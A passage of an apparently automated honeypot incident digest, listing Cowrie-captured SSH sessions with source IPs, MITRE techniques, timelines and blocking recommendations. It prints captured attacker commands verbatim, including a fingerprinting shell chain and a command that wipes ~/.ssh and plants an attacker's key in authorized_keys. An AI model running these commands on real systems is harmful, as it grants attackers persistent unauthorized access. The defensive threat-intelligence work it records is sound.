| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.success` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:12` | `cowrie.log.closed` |
| `2026-07-28 14:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-841edb0bc9c9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:03 |
| **Last Seen** | 2026-07-28 14:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:03:14` | `cowrie.session.connect` |
| `2026-07-28 14:03:15` | `cowrie.client.version` |
| `2026-07-28 14:03:15` | `cowrie.client.kex` |
| `2026-07-28 14:03:18` | `cowrie.login.success` |
| `2026-07-28 14:03:20` | `cowrie.session.params` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.success` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:20` | `cowrie.command.input` |
| `2026-07-28 14:03:21` | `cowrie.log.closed` |
| `2026-07-28 14:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e10f57b4da

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:04 |
| **Last Seen** | 2026-07-28 14:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:04:23` | `cowrie.session.connect` |
| `2026-07-28 14:04:23` | `cowrie.client.version` |
| `2026-07-28 14:04:23` | `cowrie.client.kex` |
| `2026-07-28 14:04:26` | `cowrie.login.success` |
| `2026-07-28 14:04:28` | `cowrie.session.params` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.success` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:28` | `cowrie.command.input` |
| `2026-07-28 14:04:29` | `cowrie.log.closed` |
| `2026-07-28 14:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495cad1098ba

| Field | Detail |
|---|---|
| **Source IP** | `137.255.13[.]19` |
| **First Seen** | 2026-07-28 14:05 |
| **Last Seen** | 2026-07-28 14:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:05:10` | `cowrie.session.connect` |
| `2026-07-28 14:05:10` | `cowrie.client.version` |
| `2026-07-28 14:05:10` | `cowrie.client.kex` |
| `2026-07-28 14:05:11` | `cowrie.login.success` |
| `2026-07-28 14:05:12` | `cowrie.session.params` |
| `2026-07-28 14:05:12` | `cowrie.command.input` |
| `2026-07-28 14:05:12` | `cowrie.command.failed` |
| `2026-07-28 14:05:12` | `cowrie.log.closed` |
| `2026-07-28 14:05:13` | `cowrie.session.params` |
| `2026-07-28 14:05:13` | `cowrie.command.input` |
| `2026-07-28 14:05:13` | `cowrie.session.file_download` |
| `2026-07-28 14:05:13` | `cowrie.log.closed` |
| `2026-07-28 14:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.255.13[.]19` to AbuseIPDB if not already reported
- [ ] Block `137.255.13[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09520eb0229c

| Field | Detail |
|---|---|
| **Source IP** | `137.255.13[.]19` |
| **First Seen** | 2026-07-28 14:05 |
| **Last Seen** | 2026-07-28 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:05:13` | `cowrie.session.connect` |
| `2026-07-28 14:05:13` | `cowrie.client.version` |
| `2026-07-28 14:05:13` | `cowrie.client.kex` |
| `2026-07-28 14:05:14` | `cowrie.login.success` |
| `2026-07-28 14:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.255.13[.]19` to AbuseIPDB if not already reported
- [ ] Block `137.255.13[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66cfa0917ebf

| Field | Detail |
|---|---|
| **Source IP** | `137.255.13[.]19` |
| **First Seen** | 2026-07-28 14:05 |
| **Last Seen** | 2026-07-28 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:05:14` | `cowrie.session.connect` |
| `2026-07-28 14:05:14` | `cowrie.client.version` |
| `2026-07-28 14:05:15` | `cowrie.client.kex` |
| `2026-07-28 14:05:15` | `cowrie.login.success` |
| `2026-07-28 14:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.255.13[.]19` to AbuseIPDB if not already reported
- [ ] Block `137.255.13[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f3acb6995b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:05 |
| **Last Seen** | 2026-07-28 14:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:05:31` | `cowrie.session.connect` |
| `2026-07-28 14:05:31` | `cowrie.client.version` |
| `2026-07-28 14:05:31` | `cowrie.client.kex` |
| `2026-07-28 14:05:34` | `cowrie.login.success` |
| `2026-07-28 14:05:35` | `cowrie.session.params` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.success` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:35` | `cowrie.command.input` |
| `2026-07-28 14:05:36` | `cowrie.log.closed` |
| `2026-07-28 14:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93da973366c0

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-28 14:06 |
| **Last Seen** | 2026-07-28 14:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:06:00` | `cowrie.session.connect` |
| `2026-07-28 14:06:01` | `cowrie.client.version` |
| `2026-07-28 14:06:01` | `cowrie.client.kex` |
| `2026-07-28 14:06:02` | `cowrie.login.success` |
| `2026-07-28 14:06:03` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d2c0c0861b

| Field | Detail |
|---|---|
| **Source IP** | `76.133.97[.]153` |
| **First Seen** | 2026-07-28 14:06 |
| **Last Seen** | 2026-07-28 14:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:06:08` | `cowrie.session.connect` |
| `2026-07-28 14:06:09` | `cowrie.client.version` |
| `2026-07-28 14:06:09` | `cowrie.client.kex` |
| `2026-07-28 14:06:10` | `cowrie.login.success` |
| `2026-07-28 14:06:11` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.133.97[.]153` to AbuseIPDB if not already reported
- [ ] Block `76.133.97[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2362188a295

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:06 |
| **Last Seen** | 2026-07-28 14:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:06:40` | `cowrie.session.connect` |
| `2026-07-28 14:06:40` | `cowrie.client.version` |
| `2026-07-28 14:06:40` | `cowrie.client.kex` |
| `2026-07-28 14:06:43` | `cowrie.login.success` |
| `2026-07-28 14:06:44` | `cowrie.session.params` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.success` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:44` | `cowrie.command.input` |
| `2026-07-28 14:06:45` | `cowrie.log.closed` |
| `2026-07-28 14:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02898703dade

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:07 |
| **Last Seen** | 2026-07-28 14:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:07:51` | `cowrie.session.connect` |
| `2026-07-28 14:07:52` | `cowrie.client.version` |
| `2026-07-28 14:07:52` | `cowrie.client.kex` |
| `2026-07-28 14:07:54` | `cowrie.login.success` |
| `2026-07-28 14:07:56` | `cowrie.session.params` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.success` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.command.input` |
| `2026-07-28 14:07:56` | `cowrie.log.closed` |
| `2026-07-28 14:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc99585a0807

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:09 |
| **Last Seen** | 2026-07-28 14:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:09:04` | `cowrie.session.connect` |
| `2026-07-28 14:09:05` | `cowrie.client.version` |
| `2026-07-28 14:09:05` | `cowrie.client.kex` |
| `2026-07-28 14:09:07` | `cowrie.login.success` |
| `2026-07-28 14:09:09` | `cowrie.session.params` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.success` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:09` | `cowrie.command.input` |
| `2026-07-28 14:09:10` | `cowrie.log.closed` |
| `2026-07-28 14:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd320367f10

| Field | Detail |
|---|---|
| **Source IP** | `165.232.61[.]133` |
| **First Seen** | 2026-07-28 14:09 |
| **Last Seen** | 2026-07-28 14:10 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:09:19` | `cowrie.session.connect` |
| `2026-07-28 14:09:25` | `cowrie.client.version` |
| `2026-07-28 14:09:25` | `cowrie.client.kex` |
| `2026-07-28 14:09:56` | `cowrie.login.success` |
| `2026-07-28 14:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.61[.]133` to AbuseIPDB if not already reported
- [ ] Block `165.232.61[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05eda97a9ee5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 14:09 |
| **Last Seen** | 2026-07-28 14:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:09:51` | `cowrie.session.connect` |
| `2026-07-28 14:09:51` | `cowrie.client.version` |
| `2026-07-28 14:09:51` | `cowrie.client.kex` |
| `2026-07-28 14:09:52` | `cowrie.login.success` |
| `2026-07-28 14:09:52` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:09:52` | `cowrie.direct-tcpip.data` |
| `2026-07-28 14:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f496d00357c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:10 |
| **Last Seen** | 2026-07-28 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:10:17` | `cowrie.session.connect` |
| `2026-07-28 14:10:17` | `cowrie.client.version` |
| `2026-07-28 14:10:17` | `cowrie.client.kex` |
| `2026-07-28 14:10:19` | `cowrie.login.success` |
| `2026-07-28 14:10:22` | `cowrie.session.params` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.success` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.command.input` |
| `2026-07-28 14:10:22` | `cowrie.log.closed` |
| `2026-07-28 14:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0c31408afc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:11 |
| **Last Seen** | 2026-07-28 14:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:11:28` | `cowrie.session.connect` |
| `2026-07-28 14:11:28` | `cowrie.client.version` |
| `2026-07-28 14:11:28` | `cowrie.client.kex` |
| `2026-07-28 14:11:31` | `cowrie.login.success` |
| `2026-07-28 14:11:33` | `cowrie.session.params` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.success` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:33` | `cowrie.command.input` |
| `2026-07-28 14:11:34` | `cowrie.log.closed` |
| `2026-07-28 14:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d8461eebb8

| Field | Detail |
|---|---|
| **Source IP** | `191.193.162[.]238` |
| **First Seen** | 2026-07-28 14:12 |
| **Last Seen** | 2026-07-28 14:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
